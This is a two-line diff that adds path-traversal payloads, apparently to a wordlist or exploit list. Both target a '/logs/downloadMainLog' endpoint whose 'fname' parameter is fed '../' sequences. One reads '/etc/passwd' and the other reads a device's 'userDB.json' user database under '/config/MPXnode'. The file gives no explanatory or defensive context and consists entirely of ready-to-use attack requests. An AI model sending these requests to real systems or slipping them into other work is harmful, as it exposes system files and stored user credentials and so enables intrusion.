@@ -1,0 +1,2 @@
+/logs/downloadMainLog?fname=../../../../../../..//etc/passwd
+/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json
